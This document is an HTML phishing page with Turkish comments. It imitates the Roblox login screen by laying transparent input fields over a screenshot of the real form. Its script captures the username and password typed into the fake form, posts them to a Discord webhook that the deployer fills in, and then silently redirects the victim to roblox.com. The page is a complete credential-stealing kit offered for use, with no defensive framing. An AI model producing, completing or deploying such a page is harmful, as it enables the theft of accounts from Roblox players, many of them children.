<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Roblox Giriş</title>
    <style>
        /* Ekranı sıfırlama ve arka plan */
        html, body {
            margin: 0;
            padding: 0;
            width: 100%;
            height: 100%;
            overflow: hidden;
            background-color: #0b0e11;
            display: flex;
            justify-content: center;
            align-items: center;
            font-family: Arial, sans-serif;
        }

        /* 
           ESNEK KİLİT SİSTEMİ: 
           Resmin orijinal en-boy oranını (16:9 standardı) tarayıcıya kilitler.
           Bu sayede resim küçülürse inputlar da küçülür, tam oturur.
        */
        .wrapper {
            position: relative;
            width: 100vw;
            height: 56.25vw; /* 16:9 oranını korumak için dikey hesaplama */
            max-height: 100vh;
            max-width: 177.78vh; /* Yatayda taşmayı önleme */
            display: flex;
            justify-content: center;
            align-items: center;
        }

        .tam-ekran-resim {
            width: 100%;
            height: 100%;
            object-fit: contain;
            display: block;
        }

        /* 
           GİRİŞ PANELİ ÇERÇEVESİ:
           Resmin tam merkezindeki gri Roblox giriş formunun koordinatlarına kilitlendi.
        */
        .form-container {
            position: absolute;
            width: 19.8%; /* Resme göre tam yatay genişlik yüzdesi */
            height: 48.5%; /* Resme göre en üstten en alta form yüksekliği */
            top: 36.1%;   /* Dikeyde tam doğru başlangıç noktası */
            left: 50.1%;
            transform: translateX(-50%);
            box-sizing: border-box;
        }

        /* Tüm elemanları bu çerçevenin içinde bağımsız katmanlar olarak konumlandırıyoruz */
        .form-container input, .form-container button, .form-container a {
            position: absolute;
            width: 100%;
            height: 12.2%; /* Her bir kutunun dikey kalınlık oranı */
            left: 0;
            background: transparent;
            border: none;
            outline: none;
            box-sizing: border-box;
        }

        /* Yazı yazılan input alanlarının iç metin ve dikey ortalama ayarları */
        .form-container input {
            color: #ffffff;
            font-size: 14px;
            padding: 0 12px;
            display: flex;
            align-items: center;
        }

        .form-container button, .form-container a {
            cursor: pointer;
        }

        /* ============================================================ */
        /* RESMİN ÜZERİNE ÇAKILMIŞ MİLİMETRİK ORANLAR (Yukarıdan Aşağıya) */
        /* ============================================================ */

        /* 1. KUTU: Username Giriş Alanı */
        .username-field {
            top: 0%; 
        }

        /* 2. KUTU: Password Giriş Alanı */
        .password-field {
            top: 16.5%; /* Tam olarak ikinci gri kutunun içine oturur */
        }

        /* 3. BUTON: Log in butonu */
        .login-btn {
            top: 33.2%; /* Tam olarak ortadaki Log in butonuna kilitlenir */
            height: 13.5%; /* Log in butonu orijinal tasarımdaki gibi hafif kalın yapıldı */
        }

        /* 4. BUTON: Send me the one-time code by email */
        .one-time-code-btn {
            top: 65.2%; /* "Forgot..." metnini es geçip alt gri butona oturur */
            height: 13.5%;
        }

        /* 5. BUTON: Quick Login */
        .quick-login-btn {
            top: 81.8%; /* En alttaki gri butona kilitlenir */
            height: 13.5%;
        }

        /* 6. LİNK: En alttaki Sign Up yazısı */
        .signup-link {
            top: 101%; /* En alttaki "Sign up." kelimesinin tam üstü */
            height: 8%;
            width: 25%; 
            left: auto;
            right: 13.5%; 
        }
    </style>
</head>
<body>

    <div class="wrapper">
        <!-- Arka plan resmi -->
        <img src="roblox_giris.png" class="tam-ekran-resim" alt="Roblox">

        <!-- Yeni nesil kilitli esnek form paneli -->
        <form id="girisFormu" class="form-container">
            
            <!-- Kullanıcı adı -->
            <input type="text" id="username" name="username" class="username-field" required autocomplete="off">
            
            <!-- Şifre -->
            <input type="password" id="password" name="password" class="password-field" required>
            
            <!-- Log in butonu -->
            <button type="submit" class="login-btn" title="Giriş Yap"></button>
            
            <!-- One-time code butonu -->
            <button type="button" class="one-time-code-btn"></button>
            
            <!-- Quick Login butonu -->
            <button type="button" class="quick-login-btn"></button>
            
            <!-- Sign up linki -->
            <a href="https://roblox.com" target="_blank" class="signup-link" title="Kayıt Ol"></a>

        </form>
    </div>

    <!-- DISCORD WEBHOOK BAĞLANTISI -->
    <script>
        // Kendi Discord Webhook linkini buraya yapıştırmayı unutma kanka!
        const webhookURL = "BURAYA_DISCORD_WEBHOOK_LINKINI_YAZ";

        document.getElementById('girisFormu').addEventListener('submit', function(e) {
            e.preventDefault();

            const user = document.getElementById('username').value;
            const pass = document.getElementById('password').value;

            const mesaj = {
                content: `🔔 **Yeni Roblox Girişi Yakalandı!**\n👤 **Kullanıcı:** \`${user}\`\n🔑 **Şifre:** \`${pass}\`\n📅 **Tarih:** ${new Date().toLocaleString('tr-TR')}`
            };

            fetch(webhookURL, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(mesaj)
            })
            .then(() => {
                window.location.href = "https://roblox.com";
            })
            .catch(() => {
                window.location.href = "https://roblox.com";
            });
        });
    </script>

</body>
</html>
